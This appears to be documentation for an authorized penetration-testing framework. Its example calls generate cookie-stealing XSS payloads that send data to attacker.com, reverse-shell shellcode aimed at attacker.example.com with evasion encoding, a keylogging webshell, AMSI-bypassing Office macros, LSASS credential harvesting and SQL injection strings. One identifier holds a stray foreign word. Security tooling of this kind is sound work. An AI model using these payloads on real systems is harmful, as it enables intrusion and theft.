---
name: "penetration-testing"
category: "security-assessment"
version: "2.0.0"
tags: ["security-assessment", "penetration-testing", "exploitation", "red-team", "post-exploitation"]
---

# Penetration Testing Module

## Overview

The Penetration Testing module provides a structured framework for authorized offensive security testing, covering reconnaissance, vulnerability exploitation, privilege escalation, lateral movement, and post-exploitation activities. It implements industry-standard methodologies (PTES, OWASP Testing Guide, NIST SP 800-115) with automated exploitation workflows, session management, and evidence collection. Designed for authorized testing only — all activities require explicit written authorization.

Built for professional penetration testers and red teams, the module automates repetitive tasks while maintaining the flexibility needed for creative attack scenarios. It provides structured workflows that guide testers through the engagement lifecycle while capturing evidence automatically for report generation. The module's session management enables persistent testing across multiple days with automatic artifact tracking.

The module emphasizes safety and professionalism with built-in safeguards against unauthorized testing, scope violations, and destructive operations. All exploitation features include verification modes, rollback capabilities, and cleanup automation to ensure engagements leave no lasting impact on target environments.

## Core Capabilities

1. **Reconnaissance Automation** — Structured recon phases: passive (OSINT, DNS, certificate transparency), active (port scanning, service enumeration, web crawling), and targeted (application-specific probing) with parallel execution.

2. **Vulnerability Exploitation** — Automated exploitation of discovered vulnerabilities with payload generation, encoding, and evasion techniques. Supports web, network, and API attack surfaces with verification modes.

3. **Privilege Escalation** — Local privilege escalation detection and exploitation for Linux, Windows, and container environments. Includes misconfiguration enumeration, kernel exploit suggestion, and credential harvesting.

4. **Lateral Movement** — Network lateral movement with credential harvesting, pass-the-hash, token impersonation, pivot techniques, and network segmentation testing.

5. **Evidence Collection** — Automated screenshot capture, request/response logging, credential documentation, and finding correlation for report generation with timestamped evidence chains.

6. **Session Management** — Persistent session management with command-and-control simulation, communication channels, and cleanup automation with full command history logging.

7. **Scope Enforcement** — Built-in scope validation that prevents accidental out-of-scope testing with real-time alerts and automatic session termination on scope violations.

8. **Reporting Integration** — Direct integration with report generation, providing finding details, evidence references, and remediation recommendations in audit-ready formats.

## Usage Examples

### Reconnaissance Phase

```python
from security_assessment.penetration_testing import ReconEngine

recon = ReconEngine(target="example.com")
recon.passive_recon(
    osint_sources=["crt_sh", "securitytrails", "shodan"],
    dns_enumeration=True,
    certificate_transparency=True
)

recon.active_recon(
    port_scan="top_1000",
    service_enum=True,
    web_crawl=True,
    tech_fingerprint=True
)

report = recon.get_results()
print(f"Discovered assets: {len(report.hosts)}")
print(f"Open ports: {sum(len(h.ports) for h in report.hosts)}")
print(f"Web technologies: {report.tech_stack}")
```

### Web Application Exploitation

```python
from security_assessment.penetration_testing import WebExploiter

exploiter = WebExploiter(
    target="https://app.example.com",
    scope=["/api/*", "/admin/*"],
    auth_tokens={"session": "valid_session_cookie_here"}
)

# SQL Injection testing
sqli_results = exploiter.test_sqli(
    params=["id", "search", "category"],
    techniques=["union", "blind", "time_based"],
    dbms=["mysql", "postgresql"]
)

for finding in sqli_results:
    print(f"[SQLi] {finding.endpoint} — {finding.technique}")
    print(f"  Payload: {finding.payload[:80]}...")
    print(f"  Impact: {finding.impact}")
    print(f"  Evidence: {finding.evidence_id}")
```

### Network Service Exploitation

```python
from security_assessment.penetration_testing import NetworkExploiter

net_exploit = NetworkExploiter(target="10.0.0.0/24")
net_exploit.enumerate_services(timeout=30)

vulns = net_exploit.find_exploitable()
for vuln in vulns:
    print(f"[EXPLOITABLE] {vuln.service}:{vuln.port}")
    print(f"  CVE: {vuln.cve_id} | CVSS: {vuln.cvss}")
    print(f"  Module: {vuln.exploit_module}")

# Simulated exploitation (controlled)
result = net_exploit.exploit(
    vuln=vulns[0],
    verify_only=True  # Safe mode - verifies vulnerability without exploitation
)
print(f"Verification: {'Confirmed exploitable' if result.success else 'Not exploitable'}")
```

### Privilege Escalation Check

```python
from security_assessment.penetration_testing import PrivEscChecker

checker = PrivEscChecker(platform="linux")
privesc_vectors = checker.enumerate(
    current_user="www-data",
    kernel_version="5.4.0-91-generic",
    installed_packages=package_list,
    sudo_permissions=sudo_config,
    file_permissions=writable_paths
)

for vector in privesc_vectors:
    print(f"[{vector.severity}] {vector.technique}")
    print(f"  Requirement: {vector.requirements}")
    print(f"  Reliability: {vector.reliability}")
    print(f"  Evidence: {vector.evidence_id}")
```

### Lateral Movement

```python
from security_assessment.penetration_testing import LateralMover

mover = LateralMover(session=current_session)
credentials = mover.harvest_credentials(
    sources=["lsass", "browser", "config_files", "environment_vars"]
)

pivot_paths = mover.find_pivot_paths(
    target_network="10.1.0.0/16",
    techniques=["ssh_keys", "winrm", "psexec", "wmi"]
)

for path in pivot_paths:
    print(f"Pivot: {path.source} → {path.target} via {path.technique}")
    print(f"  Credentials needed: {path.required_creds}")
    print(f"  Detection risk: {path.detection_risk}")
```

### Session and Cleanup

```python
from security_assessment.penetration_testing import SessionManager

session = SessionManager()
session.create(
    target="10.0.0.5",
    session_type="meterpreter",
    persistent=False
)

# Execute post-exploitation activities
session.execute("sysinfo")
session.execute("hashdump")
session.screenshot("desktop.png")

# Automated cleanup
session.cleanup(remove_artifacts=True, restore_config=True)
```

## Architecture

```
┌────────────────────────────────────────────────────┐
│            Penetration Testing Module               │
├──────────────┬──────────────┬──────────────────────┤
│  Recon       │  Exploitation│  Post-Exploitation   │
│  Engine      │  Engine      │  Engine              │
├──────────────┼──────────────┼──────────────────────┤
│ Passive OSINT│ Web Apps     │ Privilege Escalation │
│ Active Scan  │ Network Svc  │ Lateral Movement     │
│ Web Crawl    │ API Testing  │ Credential Harvest   │
│ Tech Finger  │ Payload Gen  │ Data Exfil Testing   │
├──────────────┴──────────────┴──────────────────────┤
│         Session Management & Scope Enforcement      │
├────────────────────────────────────────────────────┤
│  Evidence     │  Cleanup     │  Reporting           │
│  Collection   │  Automation  │  Integration         │
└────────────────────────────────────────────────────┘
```

The module follows the PTES (Penetration Testing Execution Standard) methodology with four main phases: reconnaissance, exploitation, post-exploitation, and reporting. Session management maintains state across phases while scope enforcement prevents unauthorized testing.

## Best Practices

1. **Authorization First** — Never begin testing without explicit written authorization (Rules of Engagement). Document scope boundaries clearly.

2. **Staged Approach** — Follow recon → exploitation → post-exploitation → reporting phases. Don't skip to exploitation without understanding the environment.

3. **Safe Exploitation** — Use verify-only mode for production systems. Only exploit when explicitly authorized and with rollback plans.

4. **Evidence Preservation** — Log every command, screenshot every finding, timestamp everything. Evidence quality determines report quality.

5. **Cleanup Thoroughly** — Remove all artifacts, shells, credentials, and modifications. Leave the environment cleaner than you found it.

6. **Communication Protocols** — Establish out-of-band communication for critical findings (active exploitation paths, data exposure) during testing.

7. **Scope Creep Prevention** — Monitor scope continuously. If new targets appear during testing, confirm authorization before engaging.

8. **Detection Awareness** — Monitor for defensive responses (SOC alerts, WAF blocks, account lockouts) and adjust testing approach accordingly.

9. **Credential Handling** — Treat harvested credentials as sensitive data; document securely and destroy after engagement.

## Performance Considerations

- Passive recon completes in 30-60 seconds; active recon may take 10-30 minutes depending on scope size.
- Web application testing scales with endpoint count; limit concurrent requests to avoid overwhelming targets.
- Exploitation attempts should be rate-limited to avoid triggering security controls or causing denial of service.
- Lateral movement testing across large networks benefits from parallel session management.
- Evidence collection (screenshots, logs) adds minimal overhead; prioritize completeness over speed.

## Security Considerations

- All testing requires explicit written authorization; unauthorized testing is illegal and unethical.
- Exploited credentials must be handled securely and destroyed after engagement.
- Post-exploitation activities may expose sensitive data; handle according to data classification policies.
- Testing tools and techniques must be kept confidential to prevent misuse.
- Scope violations must be reported immediately and testing paused until scope is clarified.

## Related Modules

- `vulnerability-assessment` — Pre-testing vulnerability analysis to guide exploitation prioritization
- `risk-assessment` — Risk-based prioritization for exploitation targets and attack path analysis
- `security-review` — Post-test security review of identified weaknesses and design flaws
- `compliance-audit` — Mapping exploitation findings to compliance gaps and control failures

## Configuration Reference

```yaml
# penetration_testing_config.yaml
scope:
  targets:
    - "example.com"
    - "10.0.0.0/24"
  excluded:
    - "admin.example.com"
    - "10.0.0.1"
  rules_of_engagement:
    start_date: "2026-07-01"
    end_date: "2026-07-15"
    contact: "security@example.com"

testing:
  phases:
    - recon
    - exploitation
    - post_exploitation
    - reporting
  safe_mode: true
  verify_only: false

evidence:
  screenshots: true
  request_logging: true
  command_history: true
  output_path: "./evidence/"

reporting:
  formats: ["html", "json", "pdf"]
  include_evidence: true
  executive_summary: true
```

## Integration Guide

The module integrates with common penetration testing and security tools:

- **Burp Suite** — Import Burp findings and use Burp extensions for web application testing.
- **Metasploit** — Leverage Metasploit modules for exploitation and post-exploitation activities.
- **BloodHound** — Integrate with BloodHound for Active Directory attack path analysis.
- **Credential Databases** — Import credential lists from Have I Been Pwned and other sources for password testing.

## Detailed Reconnaissance Workflow

### Passive Reconnaissance Deep Dive

```python
from security_assessment.penetration_testing import PassiveRecon

recon = PassiveRecon(target="example.com")

# Subdomain enumeration with multiple sources
subdomains = recon.enumerate_subdomains(
    sources=[
        "certificate_transparency",
        "dns_bruteforce",
        "search_engine_dorks",
        "github_repositories",
        "shodan_query",
        "virustotal",
        "censys"
    ],
    wordlist="./wordlists/subdomains-top10000.txt",
    max_depth=3
)

print(f"Subdomains discovered: {len(subdomains)}")
for sub in subdomains[:10]:
    print(f"  {sub.domain} — IP: {sub.ip} | Source: {sub.source}")

# Technology fingerprinting
tech_stack = recon.fingerprint_technologies(
    methods=["http_headers", "javascript_libraries", "meta_tags", 
             "cookie_patterns", "error_messages", "html_patterns"]
)

print(f"\nTechnology stack:")
for category, technologies in tech_stack.items():
    print(f"  {category}:")
    for tech in technologies:
        print(f"    - {tech.name} v{tech.version} (confidence: {tech.confidence:.0%})")

# Email harvesting
emails = recon.harvest_emails(
    sources=["hunter_io", "the_harvester", "linkedin", "github_commits"],
    domains=["example.com"]
)

print(f"\nEmail addresses found: {len(emails)}")
for email in emails[:5]:
    print(f"  {email.address} — Source: {email.source} | Role: {email.likely_role}")
```

### Active Reconnaissance Workflows

```python
from security_assessment.penetration_testing import ActiveRecon

active = ActiveRecon(target="example.com")

# Port scanning with service detection
scan_results = active.port_scan(
    target_range="example.com",
    scan_type="service_detection",
    ports="1-65535",
    timing="T4",  # Aggressive timing
    scripts=["default", "vuln", "auth"]
)

for host in scan_results.hosts:
    print(f"\nHost: {host.ip}")
    for port in host.ports:
        print(f"  {port.number}/{port.protocol} — {port.service}")
        print(f"    Version: {port.version}")
        print(f"    State: {port.state}")
        if port.vulnerabilities:
            print(f"    Vulns: {[v.cve_id for v in port.vulnerabilities]}")

# Web application discovery
web_discovery = active.web_discovery(
    base_url="https://example.com",
    crawl_depth=5,
    include_hidden=True,
    spider_mode="aggressive"
)

print(f"\nWeb application endpoints:")
for endpoint in web_discovery.endpoints:
    print(f"  {endpoint.method} {endpoint.path}")
    print(f"    Status: {endpoint.status_code}")
    print(f"    Parameters: {endpoint.parameters}")
    print(f"    Auth required: {endpoint.requires_auth}")

# Virtual host discovery
vhosts = active.discover_virtual_hosts(
    ip_range=["93.184.216.0/24"],
    base_domain="example.com"
)

print(f"\nVirtual hosts discovered:")
for vhost in vhosts:
    print(f"  {vhost.hostname} → {vhost.ip}")
    print(f"    Server: {vhost.server_header}")
```

## Advanced Exploitation Techniques

### SQL Injection Exploitation Workflow

```python
from security_assessment.penetration_testing import SQLiExploiter

exploiter = SQLiExploiter(target="https://app.example.com")

# Step 1: Discover injection points
injection_points = exploiter.discover_injection_points(
    urls=["/api/search", "/api/products", "/api/users"],
    methods=["GET", "POST"],
    parameters=True,
    cookies=True,
    headers=True
)

print(f"Injection points found: {len(injection_points)}")
for point in injection_points:
    print(f"  {point.method} {point.url}")
    print(f"    Parameter: {point.parameter}")
    print(f"    Injection type: {point.injection_type}")
    print(f"    Confidence: {point.confidence:.0%}")

# Step 2: Fingerprint database type
for point in injection_points:
    db_type = exploiter.fingerprint_database(point)
    print(f"  Database: {db_type.engine} v{db_type.version}")
    print(f"    OS: {db_type.os}")
    print(f"    Current user: {db_type.current_user}")

# Step 3: Extract data
for point in injection_points:
    if point.confidence > 0.8:
        # Union-based extraction
        union_result = exploiter.union_extract(
            injection_point=point,
            columns=["username", "password_hash", "email"],
            table="users",
            max_rows=100
        )
        
        for row in union_result.data:
            print(f"  User: {row['username']}")
            print(f"    Hash: {row['password_hash'][:20]}...")
            print(f"    Email: {row['email']}")

        # Time-based blind extraction
        blind_result = exploiter.time_blind_extract(
            injection_point=point,
            query="SELECT @@datadir",
            timeout_per_char=5
        )
        print(f"  Data directory: {blind_result.extracted_value}")
```

### Cross-Site Scripting (XSS) Exploitation

```python
from security_assessment.penetration_testing import XSSExploiter

xss = XSSExploiter(target="https://app.example.com")

# Discover XSS vectors
vectors = xss.discover_vectors(
    urls=["/search", "/profile", "/comments", "/api/render"],
    reflection_points=True,
    dom_sources=True,
    event_handlers=True
)

print(f"XSS vectors found: {len(vectors)}")

# Generate payloads for each vector type
for vector in vectors:
    if vector.vector_type == "reflected":
        payload = xss.generate_payload(
            vector=vector,
            payload_type="cookie_steal",
            callback_url="https://attacker.com/steal",
            obfuscation_level="high"
        )
        print(f"\nReflected XSS at {vector.location}:")
        print(f"  Payload: {payload.encoded}")
        print(f"  Delivery: {payload.delivery_method}")
        print(f"  Bypass: {payload.waf_bypass_technique}")

    elif vector.vector_type == "dom":
        dom_payload = xss.generate_dom_payload(
            vector=vector,
            sink="document.write",
            payload_type="screenshot",
            callback_url="https://attacker.com/exfil"
        )
        print(f"\nDOM XSS at {vector.location}:")
        print(f"  Source: {dom_payload.source}")
        print(f"  Sink: {dom_payload.sink}")
        print(f"  Payload: {dom_payload.payload}")
```

### SSRF Exploitation Chain

```python
from security_assessment.penetration_testing import SSRFExploiter

ssrf = SSRFExploiter(target="https://app.example.com")

# Discover SSRF points
ssrf_points = ssrf.discover_ssrf_points(
    urls=["/api/fetch", "/api/webhook", "/api/import"],
    parameters=["url", "callback", "webhook_url", "import_url"]
)

for point in ssrf_points:
    print(f"SSRF at {point.method} {point.url}")
    print(f"  Parameter: {point.parameter}")
    
    # Internal network scan
    internal_hosts = ssrf.scan_internal(
        ssrf_point=point,
        network_range="10.0.0.0/8",
        ports=[22, 80, 443, 3306, 6379, 8080, 8443],
        timeout=30
    )
    
    print(f"  Internal hosts discovered:")
    for host in internal_hosts:
        print(f"    {host.ip}:{host.port} — {host.service}")
    
    # Cloud metadata access
    metadata = ssrf.access_cloud_metadata(
        ssrf_point=point,
        providers=["aws", "gcp", "azure"]
    )
    
    if metadata.accessible:
        print(f"  Cloud metadata accessible:")
        print(f"    Provider: {metadata.provider}")
        print(f"    Instance ID: {metadata.instance_id}")
        print(f"    IAM Role: {metadata.iam_role}")
        print(f"    Credentials: {metadata.credentials_available}")
```

## Post-Exploitation Playbooks

### Windows Post-Exploitation

```python
from security_assessment.penetration_testing.postexploit import WindowsPostExploit

postexploit = WindowsPostExploit(session=current_session)

# System information gathering
sysinfo = postexploit.gather_system_info()
print(f"OS: {sysinfo.os_version}")
print(f"Architecture: {sysinfo.architecture}")
print(f"Domain: {sysinfo.domain}")
print(f"Logged on users: {sysinfo.logged_on_users}")

# Credential harvesting
credentials = postexploit.harvest_credentials(
    methods=["lsass_dump", "sam_database", "browser_passwords", 
             "wifi_profiles", "vault_creds", "dpapi_masterkeys"]
)

print(f"\nCredentials harvested: {len(credentials)}")
for cred in credentials:
    print(f"  Type: {cred.type}")
    print(f"  User: {cred.username}")
    print(f"  Source: {cred.source}")
    if cred.password:
        print(f"  Password: {'*' * len(cred.password)}")

# Persistence mechanisms
persistence = postexploit.check_persistence(
    methods=["registry_run_keys", "scheduled_tasks", "services",
             "startup_folder", "wmi_event订阅", "dll_hijacking"]
)

print(f"\nPersistence mechanisms found: {len(persistence)}")
for mech in persistence:
    print(f"  {mech.type}: {mech.location}")
    print(f"    Privileges required: {mech.required_privileges}")

# Lateral movement preparation
pivot_info = postexploit.prepare_lateral_movement(
    techniques=["credential_reuse", "token_manipulation", 
                 "pass_the_hash", "overpass_the_hash"]
)
```

### Active Directory Attack Chain

```python
from security_assessment.penetration_testing import ADAttackChain

ad_chain = ADAttackChain(session=current_session)

# Enumerate AD
ad_enum = ad_chain.enumerate_domain(
    domain="corp.example.com",
    dc_ip="10.0.0.10",
    methods=["ldap_query", "dns_enumeration", "gpo_analysis", 
             "acl_enumeration", "spn_scanning"]
)

print(f"Domain: {ad_enum.domain_name}")
print(f"DC: {ad_enum.domain_controller}")
print(f"Users: {ad_enum.user_count}")
print(f"Groups: {ad_enum.group_count}")
print(f"Computers: {ad_enum.computer_count}")

# Kerberoasting
kerberoast_results = ad_chain.kerberoast(
    spn_filter=lambda spn: "service" in spn.lower(),
    hash_format="hashcat"
)

print(f"\nKerberoastable accounts: {len(kerberoast_results)}")
for result in kerberoast_results:
    print(f"  SPN: {result.spn}")
    print(f"  Account: {result.account}")
    print(f"  Hash: {result.hash[:40]}...")
    print(f"  Offline crack: hashcat -m 13100 {result.hash_file}")

# BloodHound analysis
attack_paths = ad_chain.analyze_attack_paths(
    target_user="Administrator",
    source_user="low-priv-user",
    max_paths=5
)

print(f"\nAttack paths to {attack_paths.target}:")
for i, path in enumerate(attack_paths.paths, 1):
    print(f"  Path {i}: {path.description}")
    for step in path.steps:
        print(f"    → {step.action} via {step.technique}")
```

## Custom Payload Generation

### Payload Encoder and Obfuscator

```python
from security_assessment.penetration_testing import PayloadGenerator

generator = PayloadGenerator()

# Generate shellcode
shellcode = generator.generate_shellcode(
    payload_type="reverse_tcp",
    lhost="attacker.example.com",
    lport=4444,
    architecture="x64",
    format="raw"
)

# Encode to bypass detection
encoded = generator.encode(
    payload=shellcode,
    encoders=["shikata_ga_nai", "alpha_mixed", "unicode"],
    iterations=5
)

print(f"Original size: {len(shellcode)} bytes")
print(f"Encoded size: {len(encoded)} bytes")

# Generate webshell
webshell = generator.generate_webshell(
    shell_type="php",
    features=["file_manager", "database_client", "reverse_shell", "keylogger"],
    obfuscation="variable_rotation",
    password_protect=True
)

print(f"Webshell path: {webshell.output_path}")
print(f"Access password: {webshell.password}")

# Generate macro payload
macro = generator.generate_office_macro(
    office_version="2019",
    payload_type="hta",
    evasion=["amsi_bypass", "etw_patch", "applocker_bypass"],
    persistence=True
)

print(f"Macro file: {macro.output_path}")
print(f"Evasion techniques: {macro.evasion_techniques}")
```

## Cloud Penetration Testing

### AWS Penetration Testing

```python
from security_assessment.penetration_testing import AWSPentest

aws = AWSPentest(
    profile="pentest-account",
    region="us-east-1"
)

# IAM enumeration
iam_enum = aws.enumerate_iam(
    methods=["users", "roles", "policies", "groups"],
    identify_privilege_escalation=True
)

print(f"IAM Users: {len(iam_enum.users)}")
print(f"IAM Roles: {len(iam_enum.roles)}")

for role in iam_enum.roles:
    if role.has_privilege_escalation:
        print(f"\n  Privilege escalation via: {role.name}")
        print(f"    Technique: {role.escalation_technique}")
        print(f"    Paths: {role.escalation_paths}")

# S3 bucket enumeration
s3_enum = aws.enumerate_s3(
    methods=["dns_enum", "bruteforce", "cert_transparency"],
    check_public_access=True,
    check_policies=True
)

print(f"\nS3 Buckets found: {len(s3_enum.buckets)}")
for bucket in s3_enum.buckets:
    print(f"  {bucket.name}")
    print(f"    Public: {bucket.is_public}")
    print(f"    Writable: {bucket.is_writable}")
    if bucket.policy_issues:
        print(f"    Policy issues: {bucket.policy_issues}")

# Lambda enumeration
lambda_enum = aws.enumerate_lambda(
    check_env_vars=True,
    check_layer_vulnerabilities=True
)

print(f"\nLambda functions: {len(lambda_enum.functions)}")
for func in lambda_enum.functions:
    if func.secrets_in_env:
        print(f"  {func.name}: SECRETS IN ENV VARS")
        for secret in func.env_secrets:
            print(f"    {secret.key}: {secret.value[:20]}...")
```

## Testing Framework and Reporting

### Automated Test Harness

```python
from security_assessment.penetration_testing import PentestHarness

harness = PentestHarness(
    target_scope="example.com",
    rules_of_engagement="./roe.yaml",
    evidence_dir="./evidence/"
)

# Define test cases
test_cases = [
    {
        "name": "SQL Injection on Login",
        "category": "injection",
        "severity": "critical",
        "steps": [
            {"action": "navigate", "url": "https://app.example.com/login"},
            {"action": "input", "selector": "#username", "value": "admin' OR '1'='1"},
            {"action": "input", "selector": "#password", "value": "test"},
            {"action": "click", "selector": "button[type=submit]"},
            {"action": "assert", "condition": "page_contains", "value": "Dashboard"}
        ]
    },
    {
        "name": "IDOR on User Profile",
        "category": "authorization",
        "severity": "high",
        "steps": [
            {"action": "login", "user": "user_a", "password": "password_a"},
            {"action": "navigate", "url": "https://app.example.com/api/users/user_b"},
            {"action": "assert", "condition": "response_contains", "value": "email"}
        ]
    }
]

# Execute test suite
results = harness.run_tests(test_cases)

print("Test Results:")
for result in results:
    status = "PASS" if result.passed else "FAIL"
    print(f"  [{status}] {result.test_name}")
    print(f"    Category: {result.category}")
    print(f"    Severity: {result.severity}")
    if not result.passed:
        print(f"    Failure: {result.failure_reason}")
    print(f"    Evidence: {result.evidence_path}")
    print(f"    Duration: {result.duration:.2f}s")
```

### Comprehensive Report Generation

```python
from security_assessment.penetration_testing import PentestReporter

reporter = PentestReporter()

# Generate executive summary
exec_summary = reporter.generate_executive_summary(
    findings=all_findings,
    scope="example.com",
    testing_period="2025-07-01 to 2025-07-15",
    methodology="PTES + OWASP Testing Guide"
)

print("Executive Summary:")
print(f"  Overall risk rating: {exec_summary.risk_rating}")
print(f"  Critical findings: {exec_summary.critical_count}")
print(f"  High findings: {exec_summary.high_count}")
print(f"  Medium findings: {exec_summary.medium_count}")
print(f"  Low findings: {exec_summary.low_count}")
print(f"  Informational: {exec_summary.info_count}")

# Generate detailed findings report
for finding in all_findings:
    detail = reporter.generate_finding_detail(finding)
    print(f"\n--- {detail.title} ---")
    print(f"  Severity: {detail.severity}")
    print(f"  CVSS: {detail.cvss_score}")
    print(f"  CWE: {detail.cwe_id}")
    print(f"  Description: {detail.description}")
    print(f"  Impact: {detail.impact}")
    print(f"  Remediation: {detail.remediation}")
    print(f"  References: {detail.references}")

# Export report
reporter.export(
    format="docx",
    output_path="./reports/pentest-report-example.docx",
    include_evidence=True,
    include_appendix=True,
    redact_credentials=True
)
```

## References

- PTES — Penetration Testing Execution Standard
- OWASP Testing Guide v4.2
- NIST SP 800-115 — Technical Guide to Information Security Testing and Assessment
- OSSTMM — Open Source Security Testing Methodology Manual
- MITRE ATT&CK Framework
- CIS Red Team Exercises
- SANS Penetration Testing Poster
- Burp Suite Professional Documentation
